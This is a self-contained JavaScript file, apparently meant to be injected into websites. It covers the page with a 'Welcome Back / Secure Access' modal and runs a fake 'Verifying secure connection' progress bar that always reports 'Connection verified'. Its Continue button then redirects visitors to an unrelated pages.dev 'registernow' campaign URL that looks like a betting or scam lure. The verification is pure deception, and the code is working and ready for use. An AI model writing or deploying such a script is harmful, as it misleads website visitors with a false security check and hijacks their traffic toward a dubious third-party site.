// User Engagement Modal with Server-Side Redirect
(function() {
    // ============================================
    // CONFIGURATION
    // ============================================
    
const CONFIG = {
    progressDuration: 2500,
    // CORRECT URL - use your actual Pages domain
    redirectURL: 'https://registernow-7ps.pages.dev/api/?campaign=welcome'
};

function getTarget() {
    return CONFIG.redirectURL;
}
    
    // ============================================

    // Inject CSS styles
    const style = document.createElement('style');
    style.textContent = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Montserrat", sans-serif;
            font-weight: bold;
            margin: 0;
            padding: 0;
        }
        
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.2s ease;
        }
        
        .popup-overlay.active {
            display: flex;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .popup-card {
            background: #242526;
            border-radius: 20px;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            transform: scale(0.95);
            opacity: 0;
            animation: popupEntry 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        
        @keyframes popupEntry {
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .close-btn {
            position: absolute;
            top: 1.25rem;
            right: 1.25rem;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: transparent;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #ffffff;
            transition: all 0.2s ease;
            line-height: 1;
        }
        
        .close-btn:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .popup-header {
            margin-bottom: 1rem;
        }
        
        .popup-header h2 {
            font-size: 2rem;
            font-weight: 700;
            color: #f48220;
            margin-bottom: 0.75rem;
            letter-spacing: -0.5px;
        }
        
        .version-badge {
            display: inline-block;
            background: #d1d1d6;
            color: #636366;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .popup-content {
            margin: 1.5rem 0 2rem 0;
        }
        
        .popup-content p {
            font-size: 22.5px;
            color: #ffffff;
            line-height: 1.6;
        }
        
        .verification-status {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 20px;
            background: #d1f4e0;
            border-radius: 14px;
            margin-bottom: 1.5rem;
            transition: background 0.3s ease;
        }
        
        .status-icon {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 2.5px solid #34c759;
            position: relative;
            flex-shrink: 0;
            background: transparent;
        }
        
        .status-icon::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 10px;
            height: 10px;
            background: #34c759;
            border-radius: 50%;
            transform: translate(-50%, -50%);
        }
        
        .status-text {
            font-size: 22.5px;
            color: #1d4d2b;
            font-weight: 500;
        }
        
        .progress-container {
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 0.5s forwards;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #c9a50a 0%, #f0c419 100%);
            border-radius: 10px;
            width: 0%;
            transition: width 0.1s linear;
            box-shadow: 0 0 10px rgba(201, 165, 10, 0.5);
        }
        
        .progress-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
            font-size: 0.75rem;
            color: #ffffff;
        }
        
        .loading-dots {
            display: inline-flex;
            gap: 3px;
        }
        
        .loading-dots span {
            width: 4px;
            height: 4px;
            background: #ffffff;
            border-radius: 50%;
            animation: dotBounce 1.4s infinite ease-in-out both;
        }
        
        .loading-dots span:nth-child(1) {
            animation-delay: -0.32s;
        }
        
        .loading-dots span:nth-child(2) {
            animation-delay: -0.16s;
        }
        
        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1.2);
                opacity: 1;
            }
        }
        
        .popup-buttons {
            display: flex;
            gap: 12px;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .popup-buttons.active {
            opacity: 1;
            pointer-events: auto;
        }
        
        .btn {
            flex: 1;
            padding: 16px 24px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 15px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
        }
        
        .btn-continue {
            background: #c9a50a;
            color: white;
            box-shadow: 0 2px 8px rgba(201, 165, 10, 0.3);
            width: 100%;
        }
        
        .btn-continue:hover {
            background: #b69609;
            box-shadow: 0 4px 12px rgba(201, 165, 10, 0.4);
        }
        
        .btn-continue:active {
            transform: scale(0.98);
        }
        
        @media screen and (max-width: 500px) {
            .popup-card {
                padding: 1.5rem;
                max-width: 95%;
                border-radius: 16px;
            }
            
            .popup-header h2 {
                font-size: 1.75rem;
            }
            
            .btn {
                width: 100%;
            }
        }
    `;
    document.head.appendChild(style);

    // Inject Google Fonts
    const fontLink = document.createElement('link');
    fontLink.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap';
    fontLink.rel = 'stylesheet';
    document.head.appendChild(fontLink);

    // Create modal HTML
    const modalHTML = `
        <div class="popup-overlay active" id="popupOverlay">
            <div class="popup-card">
                <button class="close-btn" id="closeBtn">×</button>
                
                <div class="popup-header">
                    <h2>Welcome Back</h2>
                    <span class="version-badge">Secure Access</span>
                </div>
                
                <div class="popup-content">
                    <p>We're preparing your personalized experience. Be On Anything. Anywhere. Anytime. New Customers Only</p>
                </div>
                
                <div class="verification-status" id="verificationStatus">
                    <div class="status-icon"></div>
                    <span class="status-text">Verifying secure connection</span>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-label">
                        <span id="statusText">Initializing<span class="loading-dots"><span></span><span></span><span></span></span></span>
                        <span id="progressPercent">0%</span>
                    </div>
                </div>
                
                <div class="popup-buttons" id="popupButtons">
                    <button class="btn btn-continue" id="continueBtn">Continue</button>
                </div>
            </div>
        </div>
    `;

    // Initialize
    function init() {
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        document.body.style.overflow = 'hidden';
        document.body.classList.add('modal-active');

        const overlay = document.getElementById('popupOverlay');
        const closeBtn = document.getElementById('closeBtn');
        const continueBtn = document.getElementById('continueBtn');
        const progressFill = document.getElementById('progressFill');
        const progressPercent = document.getElementById('progressPercent');
        const statusText = document.getElementById('statusText');
        const popupButtons = document.getElementById('popupButtons');
        const verificationStatus = document.getElementById('verificationStatus');
        const statusTextEl = verificationStatus.querySelector('.status-text');

        setTimeout(function() {
            animateProgress();
        }, 1000);

        function animateProgress() {
            let progress = 0;
            const interval = 50;
            const increment = (interval / CONFIG.progressDuration) * 100;

            const timer = setInterval(function() {
                progress += increment;
                
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(timer);
                    
                    progressFill.style.width = '100%';
                    progressPercent.textContent = '100%';
                    statusText.innerHTML = 'Ready ✓';
                    statusTextEl.textContent = 'Connection verified ✓';
                    verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
                    
                    setTimeout(function() {
                        popupButtons.classList.add('active');
                    }, 300);
                    
                } else {
                    progressFill.style.width = Math.round(progress) + '%';
                    progressPercent.textContent = Math.round(progress) + '%';
                }
            }, interval);
        }

        function closePopup() {
            overlay.classList.remove('active');
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-active');
        }

        // Continue button - redirect to Worker endpoint
        continueBtn.addEventListener('click', function() {
            overlay.classList.remove('active');
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-active');
            
            window.location.href = getTarget();
        });
        
        closeBtn.addEventListener('click', closePopup);

        overlay.addEventListener('click', function(e) {
            if (e.target.id === 'popupOverlay') {
                closePopup();
            }
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closePopup();
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();

